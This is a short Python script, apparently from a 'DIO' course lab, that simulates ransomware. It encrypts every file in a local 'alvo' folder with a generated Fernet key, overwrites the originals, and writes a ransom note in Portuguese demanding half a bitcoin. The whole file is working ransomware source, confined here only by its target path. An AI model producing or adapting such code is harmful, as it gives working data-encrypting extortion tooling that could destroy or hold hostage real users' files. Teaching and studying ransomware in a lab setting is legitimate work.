import os
from cryptography.fernet import Fernet

# Define o diretório onde o script está guardado
diretorio_atual = os.path.dirname(os.path.abspath(__file__))

# Define a pasta alvo dentro do diretório de teste
diretorio_alvo = os.path.join(diretorio_atual, "alvo")


def gerar_chave():
    chave = Fernet.generate_key()
    with open(os.path.join(diretorio_atual, "chave.key"), "wb") as chave_file:
        chave_file.write(chave)


def carregar_chave():
    return open(os.path.join(diretorio_atual, "chave.key"), "rb").read()


def criptografar_pasta(diretorio):
    if not os.path.exists(diretorio):
        print(f"[-] A pasta '{diretorio}' não foi encontrada.")
        return

    gerar_chave()
    chave = carregar_chave()
    f = Fernet(chave)

    contador = 0
    for arquivo in os.listdir(diretorio):
        path = os.path.join(diretorio, arquivo)
        if os.path.isfile(path) and arquivo != "chave.key" and arquivo != "LEIA_ISSO.txt":
            with open(path, "rb") as file:
                dados = file.read()

            dados_criptografados = f.encrypt(dados)

            with open(path, "wb") as file:
                file.write(dados_criptografados)
            contador += 1

    # Criar nota de resgate na pasta alvo
    with open(os.path.join(diretorio, "LEIA_ISSO.txt"), "w", encoding="utf-8") as avo:
        avo.write(
            "SEUS ARQUIVOS FORAM CRIPTOGRAFADOS PARA FINS EDUCACIONAIS!\nLaboratório DIO.DEPOSITE 1/2 BITCOIN NOS DADOS QUE ENVIEI PARA O SEU EMAIL")

    print(
        f"[+] Sucesso! {contador} arquivo(s) criptografado(s) em '{diretorio}'.")


if __name__ == "__main__":
    print(f"[*] A procurar pela pasta alvo em: {diretorio_alvo}")
    criptografar_pasta(diretorio_alvo)
